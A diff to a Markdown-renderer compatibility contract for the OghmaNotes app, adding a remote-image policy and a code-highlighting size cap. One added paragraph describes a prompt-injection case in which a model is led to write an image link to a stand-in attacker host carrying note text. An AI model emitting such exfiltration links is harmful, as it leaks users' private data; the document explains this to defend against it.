@@ -2,7 +2,7 @@
 
 > **Status:** Active compatibility contract
 >
-> **Last reviewed:** 2026-07-21
+> **Last reviewed:** 2026-10-16
 >
 > **Source of truth:** Editor/renderer code and [`src/__tests__/fixtures/markdown-contract.md`](../../src/__tests__/fixtures/markdown-contract.md)
 
@@ -21,11 +21,13 @@ OghmaNotes stores notes as portable Markdown and presents them through one writi
 
 [`MarkdownRenderer`](../../src/lib/markdown/renderer.tsx) centralizes the note, chat, and quiz pipelines.
 
-| Variant | Hard breaks | Raw HTML | Sanitized |
-|---|---:|---:|---:|
-| `note` | Yes | Parsed, then sanitized | Yes |
-| `chat` | Yes | No | Yes |
-| `quiz` | No | No | Yes |
+| Variant | Hard breaks | Raw HTML | Sanitized | Remote images |
+|---|---:|---:|---:|---:|
+| `note` | Yes | Parsed, then sanitized | Yes | Yes |
+| `chat` | Yes | No | Yes | No, shown as a link |
+| `quiz` | No | No | Yes | No, shown as a link |
+
+Chat and quiz render model output. If a prompt-injected document made the model write `![x](https://attacker/?q=<note text>)`, an auto-loading image would leak data with no click, so off-origin images in those variants render as a visible link. Same-origin images such as note assets still load. The `remoteImages` flag is applied after caller `components`, so a caller can't turn it back on.
 
 All variants share GFM, math parsing, KaTeX, safe links, inline-code styling, and the same code-block component. They also inherit one document typography layer from `.md-rendered`; the `chat` variant changes density, not component design. Variant differences must stay explicit rather than growing separate plugin stacks or per-surface element overrides.
 
@@ -43,7 +45,7 @@ The note preview supports:
   `/notes/<uuid>` routes, inserted through the editor toolbar or `[[` picker;
 - a small sanitized raw-HTML subset used by notes, including `mark`, `details`, `summary`, `kbd`, `sup`, and `sub`.
 
-Fenced code is rendered by [`CodeBlock`](../../src/lib/markdown/components/code-block.tsx) and highlighted lazily with **Shiki**, not `rehype-highlight`. Known aliases are normalized; unsupported languages fall back to plaintext; missing languages display a `CODE` label. Highlighting must never turn code content into executable HTML.
+Fenced code is rendered by [`CodeBlock`](../../src/lib/markdown/components/code-block.tsx) and highlighted lazily with **Shiki**, not `rehype-highlight`. Known aliases are normalized; unsupported languages fall back to plaintext; missing languages display a `CODE` label. Highlighting must never turn code content into executable HTML. Code longer than 50,000 characters is shown as plain text and not cached, so one huge block can't freeze the tab. A failed grammar load is retried on a later render rather than cached.
 
 Rendered notes, chat answers, and quiz content use the same semantic colours, spacing rhythm, code chrome, table treatment, task controls, and display-math surface. Compact contexts may reduce type and spacing through their renderer variant, but must not redefine Markdown elements component-by-component. Write-mode math uses the same surface tokens so switching between editing and rendered content does not introduce a new visual language.
 
@@ -60,7 +62,8 @@ Markdown is untrusted input.
 - Scripts, event attributes, and unsafe protocols such as `javascript:` must be removed.
 - Code fence content is text even when it looks like HTML.
 - Mermaid SVG is generated client-side in strict mode and sanitized before insertion; invalid diagrams retain their fenced source.
-- New renderer variants must choose raw-HTML and sanitization behaviour explicitly.
+- New renderer variants must choose raw-HTML, sanitization and remote-image behaviour explicitly.
+- Variants that render generated text must not auto-load off-origin images.
 - Do not insert user Markdown or raw code through `dangerouslySetInnerHTML`.
 
 ## Verification
